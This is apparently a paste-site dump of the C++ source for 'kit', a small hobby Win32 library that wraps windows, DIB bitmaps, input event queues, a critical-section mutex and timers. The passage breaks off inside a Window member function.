#ifndef _KIT_INC_ALL_HPP
#define _KIT_INC_ALL_HPP

#include ""commondef.hpp""
#include ""misc.hpp""
#include ""video.hpp""


#endif /* _KIT_INC_ALL_HPP */

/*-include\kit\all.hpp-*/


/*+include\kit\commondef.hpp+*/

#ifndef _KIT_INC_COMMONDEF_HPP
#define _KIT_INC_COMMONDEF_HPP

namespace kit {




#ifndef   MIN
#define   MIN(a,b) ( ((a)<(b)) ? (a) : (b) )
#endif /* MIN(a,b) */

#ifndef   MAX
#define   MAX(a,b) ( ((a)>(b)) ? (a) : (b) )
#endif /* MAX(a,b) */

#ifndef   CLAMP
#define   CLAMP(n, mn, mx) MIN(MAX(n,mn),mx)
#endif /* CLAMP(n, mn, mx) */



// integer bounds
#define KIT_U8_MAX  (0xff)
#define KIT_U16_MAX (0xffff)
#define KIT_U32_MAX (0xffffffff)
#define KIT_U64_MAX (0xffffffffffffffff)
 //
#define KIT_S8_MIN  (-0x80)
#define KIT_S8_MAX  ( 0x7f)
#define KIT_S16_MIN (-0x8000)
#define KIT_S16_MAX ( 0x7fff)
#define KIT_S32_MIN (-0x80000000)
#define KIT_S32_MAX ( 0x7fffffff)
#define KIT_S64_MIN (-0x8000000000000000)
#define KIT_S64_MAX ( 0x7fffffffffffffff)


// most significant bits/Bytes
#define KIT_MSb_8  (0x80)
#define KIT_MSb_16 (0x8000)
#define KIT_MSb_32 (0x80000000)
#define KIT_MSb_64 (0x8000000000000000)
 //
#define KIT_MSB_8  (0xff)
#define KIT_MSB_16 (0xff00)
#define KIT_MSB_32 (0xff000000)
#define KIT_MSB_64 (0xff00000000000000)




#if defined(_STDINT) || defined(_CSTDINT_)
typedef uint8_t  u8 ;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef int8_t  s8 ;
typedef int16_t s16;
typedef int32_t s32;
typedef int64_t s64;

#else
typedef unsigned char      u8 ;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;
typedef signed char      s8 ;
typedef signed short     s16;
typedef signed int       s32;
typedef signed long long s64;

#endif

// for consistency
typedef float  f32;
typedef double f64;



typedef void* _GenericOpaquePtr;



};

#endif /* _KIT_INC_COMMONDEF_HPP */

/*-include\kit\commondef.hpp-*/


/*+include\kit\misc.hpp+*/

#ifndef _KIT_INC_VIDEO_MISC_HPP
#define _KIT_INC_VIDEO_MISC_HPP

#include ""commondef.hpp""
#include ""_misc_Mutex.hpp""
#include ""_misc_time.hpp""


#endif /* _KIT_INC_VIDEO_MISC_HPP */

/*-include\kit\misc.hpp-*/


/*+include\kit\video.hpp+*/

#ifndef _KIT_INC_VIDEO_HPP
#define _KIT_INC_VIDEO_HPP

#include ""commondef.hpp""
#include ""_video_misc.hpp""
#include ""_video_Window.hpp""
#include ""_video_Bitmap.hpp""


#endif /* _KIT_INC_VIDEO_HPP */

/*-include\kit\video.hpp-*/


/*+src\kit_win32\_kit_globals.hpp+*/

#ifndef _KIT_SRC_KIT_GLOBALS_HPP
#define _KIT_SRC_KIT_GLOBALS_HPP

/* tbd:
bitmap stuff
when blitting, allow for nullptr rect so that the entire thing can be copied
  (also, add separate 'blitAll' function that uses only a destination position)
*/

#include <windowsx.h>
#include <Windows.h>
#include <string.h>

#ifdef _DEBUG
#define _printf(_fmt,...) printf(_fmt,__VA_ARGS__)
#else
#define _printf(_fmt,...)
#endif

#if defined(_DEBUG)
#include <stdio.h>
#define loghere printf(""line %4i: (%s)\n"",__LINE__,__FILE__);
#else
#define loghere  /* do {} while(0); */
#endif /* _DEBUG */


#define KIT_LOCK_SPINCOUNT (2048)


//used for Window and Bitmap
#define KIT_INITIAL_STRETCH_MODE COLORONCOLOR


//class type ID numbers
#define KIT_CONTAINS_OPAQUE (0x80000000)
#define KIT_CLASSTYPE_NULL        (0)
#define KIT_CLASSTYPE_MUTEXSIMPLE (1 | KIT_CONTAINS_OPAQUE)
#define KIT_CLASSTYPE_WINDOW      (2 | KIT_CONTAINS_OPAQUE)
#define KIT_CLASSTYPE_BITMAP      (3 | KIT_CONTAINS_OPAQUE)


namespace kit {




/*++++++++++*/
/*+kit_main+*/
/*++++++++++*/

namespace w32 {



extern HINSTANCE hThisInst;
extern HINSTANCE hPrevInst;
extern LPSTR     lpszArg;
extern int       nCmdShow;

extern LARGE_INTEGER ticksPerSecond; //used in time::getTicksPerSecond()



};

/*++++++++++*/
/*+kit_main+*/
/*++++++++++*/




};


#endif /* _KIT_SRC_KIT_GLOBALS_HPP */

/*-src\kit_win32\_kit_globals.hpp-*/


/*+src\kit_win32\kit_Bitmap_shared.hpp+*/

#ifndef _KIT_SRC_KIT_BITMAP_SHARED_HPP
#define _KIT_SRC_KIT_BITMAP_SHARED_HPP

#include ""_kit_globals.hpp""


namespace kit {




/*++++++++++++*/
/*+kit_Bitmap+*/
/*++++++++++++*/

struct _BitmapOpaque {
  BITMAPINFO   info;
  HBITMAP      handle;
  color::ARGB* pixels;
  shape::point size;
  HDC          devCtx;
  s32          stretchMode; //stretch mode when used as blit destination
  u8          _unused[3];
  //false for CreateDIBitmap() bitmap, true for CreateDIBSection() bitmap
  bool         directAccess;
};



//returns true on success
static inline bool PopulateBitmapOpaque(_BitmapOpaque& bmp,
                                        const color::ARGB* pixelData,
                                        s32 width, s32 height,
                                        bool directAccess)
{
  //fill in internal bitmap info
  bmp.info.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
  bmp.info.bmiHeader.biWidth       = width;
  bmp.info.bmiHeader.biHeight      = height;
  bmp.info.bmiHeader.biPlanes      = 1;      //should always be 1
  bmp.info.bmiHeader.biBitCount    = 32;     //for 0x--RRGGBB
  bmp.info.bmiHeader.biCompression = BI_RGB; //uncompressed rgb

  bmp.pixels = nullptr;

  bmp.size.x = width;
  bmp.size.y = height;

  //create the bitmap's device context (for rendering directly to the bitmap)
  bmp.stretchMode  = KIT_INITIAL_STRETCH_MODE;

  //determines whether you can edit the bitmap color data directly
  bmp.directAccess = directAccess;


  bmp.devCtx = CreateCompatibleDC(nullptr);
  if(bmp.devCtx == nullptr) return false;


  if(directAccess){
    bmp.handle = CreateDIBSection(nullptr, &bmp.info, DIB_RGB_COLORS,
                                  (void**)&bmp.pixels, nullptr, 0);
    if(pixelData!=nullptr && bmp.pixels!=nullptr)
      memcpy(bmp.pixels, pixelData, sizeof(color::ARGB)*width*height);
  } else {
    bmp.handle = CreateDIBitmap(nullptr, (BITMAPINFOHEADER*)&bmp.info,
                                (pixelData != nullptr) ? CBM_INIT : 0,
                                pixelData, &bmp.info, DIB_RGB_COLORS);
  }


  if(bmp.handle != nullptr){
    SelectObject(bmp.devCtx, bmp.handle);
    SetStretchBltMode(bmp.devCtx, KIT_INITIAL_STRETCH_MODE);
    return true;
  } else {
    DeleteDC(bmp.devCtx);
    bmp.devCtx = nullptr;
    return false;
  }
}



static inline bool ResizeBitmapOpaque(_BitmapOpaque& bmp,
                                      s32 width, s32 height)
{
  //set dimensions of bitmap to new values
  bmp.size.x = width;
  bmp.size.y = height; //working with shape::point is a lot prettier than...
  bmp.info.bmiHeader.biWidth  = width; //...whatever this is
  bmp.info.bmiHeader.biHeight = height;


  //delete old bitmap
  if(bmp.handle != nullptr) DeleteObject(bmp.handle);


  //create new bitmap
  if(bmp.directAccess){
    bmp.handle = CreateDIBSection(nullptr, &bmp.info, DIB_RGB_COLORS,
                                  (void**)&bmp.pixels, nullptr, 0);

  } else {
    bmp.handle = CreateDIBitmap(nullptr, (BITMAPINFOHEADER*)&bmp.info,
                                0, nullptr, &bmp.info, DIB_RGB_COLORS);
  }


  //bind device context to new bitmap
  SelectObject(bmp.devCtx, bmp.handle);


  return true;
}

/*------------*/
/*-kit_Bitmap-*/
/*------------*/




};

#endif /* _KIT_SRC_KIT_BITMAP_SHARED_HPP */

/*-src\kit_win32\kit_Bitmap_shared.hpp-*/


/*+src\kit_win32\kit_Window_shared.hpp+*/

#ifndef _KIT_SRC_KIT_WINDOW_SHARED_HPP
#define _KIT_SRC_KIT_WINDOW_SHARED_HPP

#include <kit/_video_Window.hpp>
#include ""_kit_globals.hpp""
#include ""kit_Bitmap_shared.hpp""


namespace kit {




union WindowEvent;




/*++++++++++++*/
/*+kit_Window+*/
/*++++++++++++*/

namespace w32 {
  extern u32         winCount; //number of existing kit::Window instances
  extern const char  winClassName[];
  extern WNDCLASSEXA winClass;
  extern ATOM        winClassAtom;
};



struct _WindowOpaque {
  CRITICAL_SECTION lock;

  //eventQueueEnd indicates what index should be queued to next,
   //while eventQueueNext indicates what index should be dequeued next
   //(if they are the same, that means the queue is empty!)
  WindowEvent* eventQueue;
  u16          eventQueueNext;
  u16          eventQueueEnd;

  u32         winIndex;
  HWND        winHandle;
  shape::rect winRect; //contains both window position, and window size
  DWORD       winFlags;
  DWORD       winFlagsEx;
  bool        winFullscreen;
  bool        winShown;
  bool        winFocus;
  bool        winClosed; //true if window has been destroyed, false otherwise

  WindowEvent_Key_Mod kmod; //key modifier flags for key events (shift, ctrl, ...)

  //set to true after first WINEVENT_MOUSE_MOVE since entering client area
  bool mouseWasMovedBefore;

  bool          canvasStretch; //if false, canvas is resized alongside window
  _BitmapOpaque canvas;

  shape::point mousePosition;

  bool keyStates[256]; //true if a virtual key code's key is currently pressed
};

/*------------*/
/*-kit_Window-*/
/*------------*/




/*+++++++++++++++++++++++*/
/*+kit_Window_WindowProc+*/
/*+++++++++++++++++++++++*/

namespace w32 {



extern LRESULT CALLBACK WindowProc(HWND, UINT, WPARAM, LPARAM);



};

/*-----------------------*/
/*-kit_Window_WindowProc-*/
/*-----------------------*/




static inline shape::rect ConvertToKitRect(RECT& rectIn){
  shape::rect rectOut;
  rectOut.x = rectIn.left;
  rectOut.y = rectIn.top;
  rectOut.w = rectIn.right  - rectIn.left;
  rectOut.h = rectIn.bottom - rectIn.top;
  return rectOut;
}



static inline RECT ConvertFromKitRect(shape::rect& rectIn){
  RECT rectOut;
  rectOut.left   = rectIn.x;
  rectOut.top    = rectIn.y;
  rectOut.right  = rectIn.x + rectIn.w;
  rectOut.bottom = rectIn.y + rectIn.h;
  return rectOut;
}




//assumes window is without a menu
static inline shape::point CalculateWindowSize(u32 innerWidth, u32 innerHeight,
                                               u32 flags,      u32 flagsEx)
{
  RECT winSize;
  winSize.left   = 0;
  winSize.top    = 0;
  winSize.right  = innerWidth;
  winSize.bottom = innerHeight;
  AdjustWindowRectEx(&winSize, flags, false, flagsEx);

  shape::point winSizeAdjusted;
  winSizeAdjusted.x = winSize.right  - winSize.left;
  winSizeAdjusted.y = winSize.bottom - winSize.top;
  return winSizeAdjusted;
}




static inline void HandlePreCreationWindowFlags(_WindowOpaque* opq,
                                                u32 kitWinFlags)
{
  //pre-creation window flag handling (save for WINFLAG_FULLSCREEN)
  opq->winFlags   = WS_OVERLAPPEDWINDOW; //will be hidden initially
  opq->winFlagsEx = 0;


  if(kitWinFlags & WINFLAG_FULLSCREEN) opq->winFullscreen = true;


  if(kitWinFlags & WINFLAG_BORDERLESS){
    kitWinFlags &= ~WINFLAG_RESIZABLE;
    opq->winFlags |=  WS_POPUP;
    opq->winFlags &= ~WS_CAPTION;
    opq->winFlags &= ~WS_SYSMENU;
  }

  if(!(kitWinFlags & WINFLAG_RESIZABLE)) opq->winFlags &= ~WS_THICKFRAME;

  if(kitWinFlags & WINFLAG_MINIMIZED) opq->winFlags |= WS_MINIMIZE;
  if(kitWinFlags & WINFLAG_MAXIMIZED) opq->winFlags |= WS_MAXIMIZE;
}




//returns false if queue is full
static inline bool AddToEventQueue(_WindowOpaque* opq, WindowEvent& event){
  if((opq->eventQueueEnd+1) != opq->eventQueueNext){
    opq->eventQueue[opq->eventQueueEnd++] = event;
    return true;
  } else { //don't add to queue if doing so would overwrite a previous event
    return false;
  }
}



//returns a WINEVENT_NULL event if queue is empty
static inline WindowEvent RemoveFromEventQueue(_WindowOpaque* opq){
  if(opq->eventQueueNext != opq->eventQueueEnd){
    return opq->eventQueue[opq->eventQueueNext++];
  } else {
    static WindowEvent nullEvent; //should auto-initialize to type WINEVENT_NULL
    return nullEvent;
  }
}




};

#endif /* _KIT_SRC_KIT_WINDOW_SHARED_HPP */

/*-src\kit_win32\kit_Window_shared.hpp-*/


/*+src\kit_win32\kit_Window_WindowProcEvent.hpp+*/

#ifndef _KIT_SRC_KIT_WINDOW_WINDOWPROCEVENT_HPP
#define _KIT_SRC_KIT_WINDOW_WINDOWPROCEVENT_HPP

#include <kit/_video_WindowEvent.hpp>
#include ""_kit_globals.hpp""

//(the WindowEvent used inside WindowProc is named ""event"")
#define KIT_HANDLE_EVENT(_name,...) \
  kit::WindowProcEvent::_name(event,__VA_ARGS__)


namespace kit {


namespace WindowProcEvent {




/*+WINEVENT_WIN+*/

//triggered when a window requests to be closed
static inline void WIN_CLOSE(WindowEvent& event){
  event.type = WINEVENT_WIN_CLOSE;
}



static inline void WIN_MOVED(WindowEvent& event, shape::rect& newRect){
  event.type = WINEVENT_WIN_MOVED;
  //(dataX&Y are unioned with data1&2)
  event.win.dataX = newRect.x; //new horizontal position
  event.win.dataY = newRect.y; //new vertical position
}


static inline void WIN_RESIZED(WindowEvent& event, shape::rect& newRect){
  event.type = WINEVENT_WIN_RESIZED;
  //(dataX&Y are unioned with data1&2)
  event.win.dataX = newRect.w; //new width
  event.win.dataY = newRect.h; //new height
}



static inline void WIN_UNFOCUSING(WindowEvent& event){
  event.type = WINEVENT_WIN_UNFOCUSING;
}


static inline void WIN_FOCUSED(WindowEvent& event){
  event.type = WINEVENT_WIN_FOCUSED;
}

/*-WINEVENT_WIN-*/




/*+WINEVENT_KEY+*/

union KEY_Params {
  struct {
    u32 repeatCount   : 16; // 0 -> 15
    u32 scanCode      :  8; //16 -> 23
    u32 extendedKey   :  1; //24
    u32 _reserved     :  4; //25 -> 28
    u32 altKeyDown    :  1; //29
    u32 prevUnpressed :  1; //30
    u32 currUnpressed :  1; //31
  };
  u32 value;
  KEY_Params(u32 _value) : value(_value) {}
};



//this event handler is used for KEY_CHAR, KEY_UP, and KEY_DOWN events
static inline void KEY_CHARUPDOWN(WindowEvent& event,
                                  bool charEvent,     u8 virtualKeyCode,
                                  KEY_Params& params, u16 kmods)
{
  if(charEvent){
    event.type = WINEVENT_KEY_CHAR;
  } else {
    if(params.currUnpressed) event.type = WINEVENT_KEY_UP;
    else                     event.type = WINEVENT_KEY_DOWN;
  }

  event.key.kmods = kmods;

  event.key.pkey = params.scanCode;
  event.key.vkey = virtualKeyCode;

  event.key.pressed = !params.currUnpressed;
  event.key.repeat  = params.repeatCount>0; //modified to act as a boolean
  event.key.ischar  = charEvent;
}

/*-WINEVENT_KEY-*/




/*+WINEVENT_MOUSE+*/

union MOUSE_ButtonStates {
  struct {
    u8 left    : 1;
    u8 middle  : 1;
    u8 right   : 1;
    u8 x1      : 1;
    u8 x2      : 1;
    u8 _unused : 3;
  };
  u8 value;
  MOUSE_ButtonStates() : value(0) {}
  MOUSE_ButtonStates(u8 _value) : value(_value) {}
};



//MOUSE_MOVED was already taken by a win32 macro >:(
static inline void MOUSE_MOVE(WindowEvent& event, u8 buttonStates,
                              shape::point& previous, shape::point& current)
{
  event.type = WINEVENT_MOUSE_MOVE;

  event.mouse.x = current.x;
  event.mouse.y = current.y;

  event.mouse.dx = current.x - previous.x;
  event.mouse.dy = current.y - previous.y;

  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;
}


static inline void MOUSE_LEAVE(WindowEvent& event){
  event.type = WINEVENT_MOUSE_LEAVE;
}


static inline void MOUSE_ENTER(WindowEvent& event){
  event.type = WINEVENT_MOUSE_ENTER;
}


//same event handler is used for both MOUSE_UP and MOUSE_DOWN events
static inline void MOUSE_UPDOWN(WindowEvent& event, shape::point& clickPosition,
                                u8 buttonStates, bool pressed, bool doubleClick)
{
  if(pressed) event.type = WINEVENT_MOUSE_DOWN;
  else        event.type = WINEVENT_MOUSE_UP;

  event.mouse.x = clickPosition.x;
  event.mouse.y = clickPosition.y;

  event.mouse.button   = buttonStates;
  event.mouse.pressed  = pressed;
  event.mouse.dblClick = doubleClick;
}


//same event handler is used for both MOUSE_HWHEEL and MOUSE_VWHEEL events
static inline void MOUSE_HVWHEEL(WindowEvent& event,
                                 bool verticalScroll, s16 scrollAmount,
                                 u8 buttonStates, shape::point& mousePos)
{
  if(verticalScroll){
    event.type = WINEVENT_MOUSE_VWHEEL;
    event.mouse.dy = scrollAmount/WHEEL_DELTA;
  } else {
    event.type = WINEVENT_MOUSE_HWHEEL;
    event.mouse.dx = scrollAmount/WHEEL_DELTA;
  }

  event.mouse.x = mousePos.x;
  event.mouse.y = mousePos.y;

  event.mouse.data = scrollAmount; //the scroll value before delta is applied

  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;
}

/*-WINEVENT_MOUSE-*/




}; /* WindowProcEvent */


}; /* namespace kit */

#endif /* _KIT_SRC_KIT_WINDOW_WINDOWPROCEVENT_HPP */

/*-src\kit_win32\kit_Window_WindowProcEvent.hpp-*/"
zK5j8CJY,kit_win32 as of 2024-02-22 (1/2),Kitomas,C++,Thursday 22nd of February 2024 11:55:43 PM CDT,"/*+src\kit_win32\kit_Bitmap.cpp+*/

#include <kit/_video_Bitmap.hpp>
#include ""kit_Bitmap_shared.hpp""

#define KIT_INVALID_BITMAP _kit_invalid_bitmap


namespace kit {

static const char _kit_invalid_bitmap[] = ""invalid bitmap"";




//loads from memory
Bitmap::Bitmap(const color::ARGB* pixelData,
               u32 width, u32 height,
               bool directAccess)
{
  _type = KIT_CLASSTYPE_BITMAP;
  _opq = (_BitmapOpaque*)CoTaskMemAlloc(sizeof(_BitmapOpaque));
  if(_opq == nullptr) throw ""ran out of memory creating _opq"";
  memset(_opq, 0, sizeof(_BitmapOpaque));

  if(!width ) throw ""width = 0"";
  if(!height) throw ""height = 0"";

  if(!PopulateBitmapOpaque(*_opq, pixelData, width, height, directAccess)){
    CoTaskMemFree(_opq);
    throw ""failed to create internal bitmap"";
  }

  _valid = true;
}



Bitmap::~Bitmap(){
  if(!_valid) return;
  _valid = false;

  if(_opq != nullptr){
    DeleteObject(_opq->handle);
    DeleteDC(_opq->devCtx);
    CoTaskMemFree(_opq);
    _opq = nullptr;
  }
}




}; /* namespace kit */

/*-src\kit_win32\kit_Bitmap.cpp-*/


/*+src\kit_win32\kit_main.cpp+*/

#include ""_kit_globals.hpp""

using namespace kit;


HINSTANCE w32::hThisInst = nullptr;
HINSTANCE w32::hPrevInst = nullptr;
LPSTR     w32::lpszArg   = nullptr;
int       w32::nCmdShow  = SW_HIDE;

LARGE_INTEGER w32::ticksPerSecond;




//get first and last char of string, excluding leading or trailing whitespace
 //(whitespace as in ' '; i'm not going to bother with '\t', '\n', etc.)
static inline char* _getFirstCharPtr(char* start){
  if(*start == 0) return start;
  while(*start == ' ') ++start;
  return start;
}

static inline char* _getLastCharPtr(char* start){
  if(*start == 0) return start;
  char* end = start;
  while(*(end+1) != 0 ) ++end; //go to null terminator
  while(*end == ' ') --end; //go back until a non-whitespace char is found
  return end;
}




//provided by the user
extern int main(int argc, char** argv);


//converts lpszArg to how argv normally behaves,
 //before calling a user-defined main() function
int WINAPI WinMain(HINSTANCE hThisInst, HINSTANCE hPrevInst,
                   LPSTR     lpszArg,   int       nCmdShow)
{
  //assign some global values
  w32::hThisInst = hThisInst;
  w32::hPrevInst = hPrevInst;
  w32::lpszArg   = lpszArg;
  w32::nCmdShow  = nCmdShow;

  QueryPerformanceFrequency(&w32::ticksPerSecond);


  char*      p = (char*)lpszArg;
  int    _argc = 1; //should always contain path to executable
  char** _argv = nullptr;

   //parse for the number of arguments (assuming space as delimiter)
  char* first = _getFirstCharPtr(p);
  char* last  = _getLastCharPtr(p);
  int Arg_len = (int)(last-first) + ((*first!=0) ? 1 : 0);

  if(Arg_len > 0) ++_argc;
  for(p=first; p<=last; ++p){
    if(*p == ' ') ++_argc;
  }

   //create and fill in _argv
  _argv = (char**)CoTaskMemAlloc( sizeof(char*) * _argc );
  if(_argv == nullptr) return ERROR_NOT_ENOUGH_MEMORY;
  memset(_argv, 0, sizeof(char*)*_argc ); //this may be redundant...

  char filepath[MAX_PATH]; //path to current process
  if(GetModuleFileNameA(NULL, filepath, MAX_PATH) == 0)
    return ERROR_INSUFFICIENT_BUFFER;
  _argv[0] = filepath;

  if(Arg_len > 0){
    int i = 1;
    _argv[i++] = first;
    for(p=first; p<=last; ++p){
      if(*p == ' '){
        *p = 0; //set delimiter to null
        _argv[i++] = p+1; //+1 as in +sizeof(char*)
      }
    }
    *p = 0; //make sure last arg has null terminator
  }


  int returnCode = main(_argc,_argv);
  CoTaskMemFree(_argv);
  return returnCode;
}

/*-src\kit_win32\kit_main.cpp-*/


/*+src\kit_win32\kit_Mutex.cpp+*/

#include <kit/_misc_Mutex.hpp>
#include ""_kit_globals.hpp""

#define KIT_MUTEX_NULLPTR _kit_mutex_nullptr


using namespace kit;

static const char _kit_mutex_nullptr[] = ""internal mutex = nullptr"";




MutexSimple::MutexSimple(u32 spinCount){
  _type = KIT_CLASSTYPE_MUTEXSIMPLE;

  //(no cast needed when allocating, since _mutex_ptr is already of type void*)
  _mutex_ptr = CoTaskMemAlloc(sizeof(CRITICAL_SECTION));
  if(_mutex_ptr == nullptr) throw ""ran out of memory creating internal mutex"";
  memset(_mutex_ptr, 0, sizeof(CRITICAL_SECTION));

  if(spinCount == -1){
    InitializeCriticalSection((CRITICAL_SECTION*)_mutex_ptr);
    //to my knowledge, there is no GetCriticalSectionSpinCount,
     //so i need to probe for it with a ""Set"" before setting it back
     //(also, i tried to grab the SpinCount member of the critical section
     // directly, but that seemed to result in undefined behavior for some reason!!!)
    _spinCount = SetCriticalSectionSpinCount((CRITICAL_SECTION*)_mutex_ptr, 0);
    SetCriticalSectionSpinCount((CRITICAL_SECTION*)_mutex_ptr, _spinCount);

  } else {
    InitializeCriticalSectionAndSpinCount((CRITICAL_SECTION*)_mutex_ptr, spinCount);
    _spinCount = spinCount;

  }
}



MutexSimple::~MutexSimple(){
  if(_mutex_ptr == nullptr) return;
  DeleteCriticalSection((CRITICAL_SECTION*)_mutex_ptr);
  CoTaskMemFree(_mutex_ptr);
  _mutex_ptr = nullptr;
}




void MutexSimple::setSpinCount(u32 spinCount){
  if(_mutex_ptr == nullptr) throw KIT_MUTEX_NULLPTR;
  SetCriticalSectionSpinCount((CRITICAL_SECTION*)_mutex_ptr, spinCount);
  _spinCount = spinCount;
}




void MutexSimple::lock(bool locked){
  if(_mutex_ptr == nullptr) throw KIT_MUTEX_NULLPTR;
  if(locked) EnterCriticalSection((CRITICAL_SECTION*)_mutex_ptr);
  else       LeaveCriticalSection((CRITICAL_SECTION*)_mutex_ptr);
}



bool MutexSimple::tryLock(){
  if(_mutex_ptr == nullptr) throw KIT_MUTEX_NULLPTR;
  return TryEnterCriticalSection((CRITICAL_SECTION*)_mutex_ptr);
}

/*-src\kit_win32\kit_Mutex.cpp-*/


/*+src\kit_win32\kit_time.cpp+*/

#include <kit/_misc_time.hpp>
#include ""_kit_globals.hpp""

#include <Windows.h>


namespace kit {




u64 time::getTicks(){
  LARGE_INTEGER ticks;
  QueryPerformanceCounter(&ticks);
  return ticks.QuadPart;
}



u64 time::getTicksPerSecond(){
  return w32::ticksPerSecond.QuadPart;
}



f64 time::getUptime(){
  return (f64)time::getTicks()/w32::ticksPerSecond.QuadPart;
}




void time::sleep(u32 milliseconds){
  Sleep(milliseconds);
}




}; /* namespace kit */

/*-src\kit_win32\kit_time.cpp-*/


/*+src\kit_win32\kit_Window.cpp+*/

#include <kit/_video_Window.hpp>
#include ""kit_Window_shared.hpp""

#define KIT_IS_INVALID_WINDOW ( (!_valid && !_constructing) || _opq->winClosed )
#define KIT_INVALID_WINDOW _kit_invalid_window


namespace kit {

static const char _kit_invalid_window[] = ""invalid window"";

namespace w32 {
  u32         winCount = 0; //number of existing kit::Window instances
  const char  winClassName[] = ""kit::Window Class"";
  WNDCLASSEXA winClass;
  ATOM        winClassAtom;
};




Window::Window(const char* windowTitle,
               u32 windowWidth, u32 windowHeight,
               u32 windowFlags,
               s32 windowX,     s32 windowY,
               u32 canvasWidth, u32 canvasHeight,
               bool directAccess)
{
  _type = KIT_CLASSTYPE_WINDOW;

  _opq = (_WindowOpaque*)CoTaskMemAlloc(sizeof(_WindowOpaque));
  if(_opq == nullptr) throw ""ran out of memory creating _opq"";
  memset(_opq, 0, sizeof(_WindowOpaque));

  char* errorText = ""no error"";
  if(0){ //this code block is only entered via goto in the event of an exception
    //(destroying the window is unnecessary, as it's the last thing to be made anyway)
    //_DestroyWindow  : DestroyWindow(_opq->winHandle);
    _DestroyCanvas  : DeleteObject(_opq->canvas.handle);
                      DeleteDC(_opq->canvas.devCtx);
    _UnregisterClass: if(w32::winCount == 0) UnregisterClassA(w32::winClassName, w32::hThisInst);
    _DelCritSection : DeleteCriticalSection(&_opq->lock);
    _FreeOpaque     : CoTaskMemFree(_opq);
    throw (const char*)errorText;
  }


  //window title
  if(windowTitle != nullptr){
    if( strncpy_s(_title, 256, windowTitle, 255) )
      throw ""windowTitle failed to copy"";
    _title[255] = 0; //just in case
  } else {
    _title[0] = 0;
  }


  //window size
  if(!windowWidth ) windowWidth  = GetSystemMetrics(SM_CXSCREEN);
  if(!windowHeight) windowHeight = GetSystemMetrics(SM_CYSCREEN);


  //create event queue
  _opq->eventQueue = (WindowEvent*)CoTaskMemAlloc(sizeof(WindowEvent)*65536);
  if(_opq->eventQueue == nullptr){
    errorText = ""ran out of memory creating event queue"";
    goto _FreeOpaque;
  }
  //(no memset is necessary for the event queue, thankfully)
  _opq->eventQueueNext = 0; //both indexes are 16-bit, so they'll roll over on overflow
  _opq->eventQueueEnd  = 0;  //(which is nice, since the queue's length is exactly 2^16)


  //initialize mutex
  InitializeCriticalSectionAndSpinCount(&_opq->lock, KIT_LOCK_SPINCOUNT);


  //create and register window class (only if no other windows are present)
  if(w32::winCount == 0){
    w32::winClass.cbSize        = sizeof(WNDCLASSEX);
    w32::winClass.style         = CS_DBLCLKS; //allow double clicks
    w32::winClass.lpfnWndProc   = w32::WindowProc;
    w32::winClass.cbClsExtra    = 0;
    w32::winClass.cbWndExtra    = 0;
    w32::winClass.hInstance     = w32::hThisInst;
    w32::winClass.hIcon         = nullptr;
    w32::winClass.hCursor       = LoadCursor(NULL, IDC_ARROW);
    w32::winClass.hbrBackground = nullptr;
    w32::winClass.lpszMenuName  = nullptr;
    w32::winClass.lpszClassName = w32::winClassName;
    w32::winClass.hIconSm       = nullptr; //(the window's small icon)
    w32::winClassAtom = RegisterClassExA(&w32::winClass);
    if(!w32::winClassAtom){
      errorText = ""RegisterClassA() failed"";
      goto _DelCritSection;
    }
  }


  //create canvas
  if(canvasWidth  > windowWidth ) throw ""canvasWidth > windowWidth"";
  if(canvasHeight > windowHeight) throw ""canvasHeight > windowHeight"";
  if(!canvasWidth ) canvasWidth  = windowWidth;
  if(!canvasHeight) canvasHeight = windowHeight;
  _opq->canvasStretch = (canvasWidth<windowWidth || canvasHeight<windowHeight);

  if(!PopulateBitmapOpaque(_opq->canvas, nullptr, canvasWidth, canvasHeight, directAccess))
  {
    errorText = ""failed to create canvas"";
    goto _UnregisterClass;
  }


  HandlePreCreationWindowFlags(_opq, windowFlags);


  //create window
  shape::point winSize = CalculateWindowSize(windowWidth, windowHeight,
                                             _opq->winFlags, _opq->winFlagsEx);

  _opq->winHandle = CreateWindowExA(_opq->winFlagsEx, w32::winClassName, _title,
                                    _opq->winFlags, windowX, windowY, winSize.x, winSize.y,
                                    nullptr, nullptr, w32::hThisInst, (LPVOID)this);

  if(_opq->winHandle == nullptr){
    errorText = ""CreateWindowA() failed"";
    goto _DestroyCanvas;
  }


  _opq->winRect.x = (windowX != WINPOS_UNCHANGED) ? windowX : WINPOS_UNDEFINED;
  _opq->winRect.y = (windowY != WINPOS_UNCHANGED) ? windowY : WINPOS_UNDEFINED;
  _opq->winRect.w = winSize.x;
  _opq->winRect.h = winSize.y;
  setWindowRect(&_opq->winRect);


  if(_opq->winFullscreen            ) setFullscreen(true);
  if(!(windowFlags & WINFLAG_HIDDEN)) setVisibility(true);
  if(  windowFlags & WINFLAG_FOCUS  ) setFocus(true);


  _opq->winClosed = false;
  _opq->winIndex = w32::winCount++; //set window index, before adding to total count
  _valid = true;
  _constructing = false;
}



Window::~Window(){
  if(!_valid) return;
  _valid = false;
  --w32::winCount; //remove window from total count

  if(_opq != nullptr){
    DestroyWindow(_opq->winHandle);
    DeleteObject(_opq->canvas.handle);
    DeleteDC(_opq->canvas.devCtx);
    if(w32::winCount == 0) UnregisterClassA(w32::winClassName, w32::hThisInst);
    DeleteCriticalSection(&_opq->lock);
    CoTaskMemFree(_opq->eventQueue);
    CoTaskMemFree(_opq);
    _opq = nullptr;
  }
}




bool Window::isClosed(){
  //(can't use KIT_IS_INVALID_WINDOW here)
  if(!_valid && !_constructing) throw KIT_INVALID_WINDOW;
  return _opq->winClosed; //set by w32::WindowProc, rather than destructor
}



shape::rect Window::getWindowRect(){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  return _opq->winRect;
}



shape::point Window::getCanvasSize(){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  return _opq->canvas.size;
}



color::ARGB* Window::getPixels(){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  if(_opq->canvas.directAccess) return _opq->canvas.pixels;
  else throw ""window does not support direct access"";
}




//if newRect == nullptr, the window will stretch to fit the whole screen
void Window::setWindowRect(shape::rect* newRect){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;


